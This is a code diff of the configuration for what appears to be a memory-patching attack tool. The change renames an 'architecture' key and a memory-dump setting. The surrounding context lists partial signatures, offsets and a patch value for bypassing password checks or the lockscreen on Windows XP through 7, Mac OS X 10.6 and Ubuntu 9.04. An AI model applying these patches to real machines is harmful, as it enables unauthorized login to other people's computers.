@@ -34,7 +34,7 @@ encoding = None         # System encoding
 vectorsize = 128        # Read vector size
 memdump = False         # Memory dump mode off
 dumpstart = 0x00000000  # Default memory dump start address
-dumpend = 0xffffffff    # Defualt memory dump end address
+dumpsize = False        # Not set by default
 interactive = False     # Interactive mode off
 
 #===============================================================================
@@ -105,7 +105,7 @@ interactive = False     # Interactive mode off
 
 targets=[{'OS': 'Windows 7',
           'versions': ['SP0', 'SP1'],
-          'architecture': ['x32', 'x64'],
+          'architectures': ['x32', 'x64'],
           'name': 'msv1_0.dll MsvpPasswordValidate technique',
           'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password.',
           'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], #x64
@@ -127,7 +127,7 @@ targets=[{'OS': 'Windows 7',
                                       'patchoffset': 0x00}]}]},
          {'OS': 'Windows Vista',
           'versions': ['SP0'],
-          'architecture': ['x86'],
+          'architectures': ['x86'],
           'name': 'msv1_0.dll MsvpPasswordValidate technique',
           'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password.',
           'signatures': [{'offsets': [0x432, 0x80f],
@@ -137,7 +137,7 @@ targets=[{'OS': 'Windows 7',
                                       'patchoffset': 0x00}]}]},
          {'OS': 'Windows XP',
           'versions': ['SP2', 'SP3'],
-          'architecture': ['x86'],
+          'architectures': ['x86'],
           'name': 'msv1_0.dll MsvpPasswordValidate technique',
           'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password. The XP2 technique patches the call which decides if an account requires password authentication. ',
           'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6],
@@ -147,7 +147,7 @@ targets=[{'OS': 'Windows 7',
                                       'patchoffset': 0x00}]}]},
          {'OS': 'Mac OS X',
           'versions': ['10.6'],
-          'architecture': ['x64'],
+          'architectures': ['x64'],
           'name': 'DoShadowHashAuth technique',
           'notes': 'Short circuits the password validation function, causing all login attempts to succeed.',
           'signatures': [{'offsets': 0x7cf,
@@ -156,7 +156,7 @@ targets=[{'OS': 'Windows 7',
                                       'patch': 0x41bf0000000048c78588}]}]},
          {'OS': 'Ubuntu',
           'versions': ['9.04'],
-          'architecture': ['x32'],
+          'architectures': ['x32'],
           'name': 'Gnome lockscreen unlock',
           'notes': 'Disables Ubuntu lockscreen.',
           'signatures': [{'offsets': 0xd3f,
